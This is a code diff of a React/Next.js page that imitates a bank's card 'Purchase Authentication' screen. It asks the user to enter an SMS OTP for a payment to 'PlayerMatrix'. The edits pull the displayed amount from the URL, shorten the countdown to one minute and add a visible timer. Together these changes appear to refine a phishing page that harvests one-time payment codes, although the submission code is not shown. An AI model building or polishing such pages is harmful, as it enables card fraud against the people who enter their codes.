@@ -7,17 +7,18 @@ import axios from 'axios';
 
 function CodePageContent() {
   const [code, setCode] = useState("");
-  const [timeLeft, setTimeLeft] = useState(300); // 5 دقائق
+  const [timeLeft, setTimeLeft] = useState(60); // دقيقة واحدة
   const [expired, setExpired] = useState(false);
   const [resending, setResending] = useState(false);
 
   const searchParams = useSearchParams();
   const refN = searchParams.get("refN");
+  const price = searchParams.get('price')
   const router = useRouter();
 
   useEffect(() => {
     if (timeLeft > 0) {
-      const timer = setTimeout(() => setTimeLeft(timeLeft - 1), 1000);
+      const timer = setTimeout(() => setTimeLeft((prev) => prev - 1), 1000);
       return () => clearTimeout(timer);
     } else {
       setExpired(true);
@@ -51,21 +52,21 @@ function CodePageContent() {
   const handleResend = () => {
     setResending(true);
     setTimeout(() => {
-      setTimeLeft(300);
+      setTimeLeft(60); // إعادة دقيقة
       setExpired(false);
       setResending(false);
     }, 1000);
   };
 
   return (
-    <div className="container my-4" style={{ maxWidth: "500px", backgroundColor: "white", border: "1px solid #ddd" }}>
+    <div className="container my-4" style={{ maxWidth: "500px", backgroundColor: "white", border: "1px solid #ddd" }} dir="ltr">
       <div className="p-4">
         <h5 className="fw-bold text-primary mb-3">Purchase Authentication</h5>
         <p className="mb-1">
           We have sent you an SMS with an OTP code to your registered mobile number. Please do not share it with anyone.
         </p>
         <p className="mb-3">
-          You are paying <strong>PlayerMatrix</strong> the amount of <strong>KWD 15.500</strong> on Wed Aug 13 2025 1:29 AM
+          You are paying <strong>PlayerMatrix</strong> the amount of <strong>KWD {price}.000</strong> on {new Date().toString()}
         </p>
 
         <label className="fw-bold mb-2">Enter your OTP code below:</label>
@@ -76,6 +77,11 @@ function CodePageContent() {
           onChange={(e) => setCode(e.target.value)}
           disabled={expired}
         />
+
+        {/* عرض العداد */}
+        <p className="text-danger fw-bold">
+          Time left: {Math.floor(timeLeft / 60)}:{String(timeLeft % 60).padStart(2, "0")}
+        </p>
 
         <div className="d-grid gap-2">
           <button 
@@ -99,7 +105,7 @@ function CodePageContent() {
             <button 
               type="button" 
               className="btn btn-secondary w-50 fw-bold"
-              onClick={() => router.back()}
+              onClick={() => router.back()} // يرجع خطوة للخلف
             >
               CANCEL
             </button>
@@ -107,7 +113,7 @@ function CodePageContent() {
         </div>
 
         <p className="mt-3 text-muted small">
-          This page will automatically time out after 5 minutes.
+          This page will automatically time out after 1 minute.
         </p>
       </div>
     </div>
@@ -120,4 +126,4 @@ export default function CodePage() {
       <CodePageContent />
     </Suspense>
   );
-      }
+}
